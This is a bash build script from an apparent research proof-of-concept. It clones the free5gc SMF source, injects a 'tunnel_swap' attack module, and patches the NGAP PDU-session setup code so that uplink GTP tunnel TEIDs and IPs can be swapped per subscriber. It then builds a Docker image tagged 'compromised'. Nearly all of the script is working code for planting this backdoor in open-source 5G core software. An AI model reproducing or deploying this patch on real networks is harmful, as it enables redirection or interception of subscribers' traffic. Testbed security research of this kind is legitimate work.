#!/bin/bash
# ============================================================================
# build_compromised_smf.sh — Build the Compromised SMF Docker Image
# ============================================================================
#
# This script:
#   1. Clones the free5gc/smf repository (main branch)
#   2. Injects the tunnel swap attack code
#   3. Patches BuildPDUSessionResourceSetupRequestTransfer to use the swap
#   4. Builds a Docker image: free5gc/smf:compromised
#
# Usage:
#   cd free5gc-compose/attack_poc
#   chmod +x build_compromised_smf.sh
#   ./build_compromised_smf.sh
#
# To return to normal:
#   ./script/rollback-to-normal.sh
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BUILD_DIR="${SCRIPT_DIR}/smf-build"
SMF_IMAGE="free5gc/smf:compromised"

echo "============================================"
echo " Building Compromised SMF Docker Image"
echo "============================================"

# Step 1: Clone SMF source (if not already)
if [ -d "${BUILD_DIR}/smf" ]; then
    echo "[*] SMF source already cloned at ${BUILD_DIR}/smf"
else
    echo "[*] Cloning free5gc/smf (main branch)..."
    mkdir -p "${BUILD_DIR}"
    git clone --depth 1 https://github.com/free5gc/smf.git "${BUILD_DIR}/smf"
fi

SMF_SRC="${BUILD_DIR}/smf"

# Step 2: Copy the tunnel_swap.go attack module into SMF context package
echo "[*] Injecting tunnel_swap.go into smf/internal/context/..."
cp "${SCRIPT_DIR}/tunnel_swap.go" "${SMF_SRC}/internal/context/tunnel_swap.go"

# Step 3: Patch ngap_build.go to hook into the attack
echo "[*] Patching ngap_build.go..."

NGAP_FILE="${SMF_SRC}/internal/context/ngap_build.go"

# Check if already patched
if grep -q "ATTACK" "${NGAP_FILE}"; then
    echo "    Already patched."
else
    # Create the patched version
    cat > "${BUILD_DIR}/ngap_build_patch.py" << 'PYTHON_PATCH'
import re
import sys

filepath = sys.argv[1]
with open(filepath, 'r') as f:
    content = f.read()

# -----------------------------------------------------------------------
# PATCH 1: In BuildPDUSessionResourceSetupRequestTransfer, after extracting
#   the n3IP and teidOct, intercept them with the attack swap logic.
#
# We replace the UL NG-U UP TNL Information block to use swapped values.
# -----------------------------------------------------------------------

# Find the original UL NG-U UP TNL Information block and replace it
old_block = '''	// UL NG-U UP TNL Information
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

new_block = '''	// UL NG-U UP TNL Information
	// >>> ATTACK: Intercept and potentially swap the UL tunnel info <<<
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		// ATTACK: Record original and get (possibly swapped) tunnel info
		swappedTEID, swappedIP, wasSwapped := AttackState.RecordAndSwap(
			ctx.LocalULTeid, n3IP, ctx.Supi)
		if wasSwapped {
			n3IP = swappedIP
			teidOct = swappedTEID
		}
		// >>> END ATTACK <<<
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

if old_block in content:
    content = content.replace(old_block, new_block)
    print("  [OK] Patched UL NG-U UP TNL Information block")
else:
    print("  [WARN] Could not find exact UL NG-U UP TNL block — may already be patched or source differs")
    # Try a more lenient match
    if 'ATTACK' not in content:
        print("  [ERROR] Patch failed — manual intervention needed")
        sys.exit(1)

with open(filepath, 'w') as f:
    f.write(content)

print("  [OK] ngap_build.go patched successfully")
PYTHON_PATCH

    python3 "${BUILD_DIR}/ngap_build_patch.py" "${NGAP_FILE}"
fi

# Step 4: Create the Dockerfile for building the compromised SMF
echo "[*] Creating Dockerfile..."
cat > "${BUILD_DIR}/Dockerfile.smf-compromised" << 'DOCKERFILE'
# Stage 1: Build the compromised SMF binary (free5gc requires Go 1.25+)
FROM golang:1.25-bookworm AS builder

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get -y install gcc cmake autoconf libtool pkg-config libmnl-dev libyaml-dev && \
    apt-get clean

WORKDIR /go/src/smf
COPY smf/ .

RUN go mod download && \
    CGO_ENABLED=0 go build -o /go/bin/smf ./cmd

# Stage 2: Minimal runtime image (certs provided by volume in compose)
FROM alpine:3.19

LABEL description="Free5GC SMF - Compromised (Tunnel Swap Attack PoC)"

RUN apk add --no-cache bash curl tcpdump

WORKDIR /free5gc
RUN mkdir -p config/ log/ cert/

COPY --from=builder /go/bin/smf ./smf

VOLUME [ "/free5gc/config", "/free5gc/cert" ]
EXPOSE 8000
DOCKERFILE

# Step 5: Build the Docker image
echo "[*] Building Docker image: ${SMF_IMAGE}..."
cd "${BUILD_DIR}"
docker build -t "${SMF_IMAGE}" -f Dockerfile.smf-compromised .

echo ""
echo "============================================"
echo " SUCCESS: ${SMF_IMAGE} built"
echo "============================================"
echo ""
echo "Next steps:"
echo "  cd ${SCRIPT_DIR}/.."
echo "  ./script/attack-up.sh"
echo ""
